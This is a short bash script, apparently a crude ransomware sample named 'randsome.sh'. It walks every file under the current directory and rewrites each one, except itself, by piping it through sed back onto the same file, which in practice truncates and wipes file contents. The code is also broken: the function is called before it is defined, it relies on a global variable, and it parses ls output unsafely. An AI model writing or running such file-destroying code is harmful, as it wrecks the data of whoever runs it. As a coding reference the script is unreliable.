#! /bin/bash

titi()
{
   # echo "\$1"
    echo "$1"
}

for i in $(ls -R ./) 
    do
       # echo "i"
        if [ "$i" != "randsome.sh" ];
        then
            crypt $i
           # echo toto;
        fi
      #  ls $i
done

crypt()
{
 cat $i | sed 's/a/pocebleu/g' > $i
}


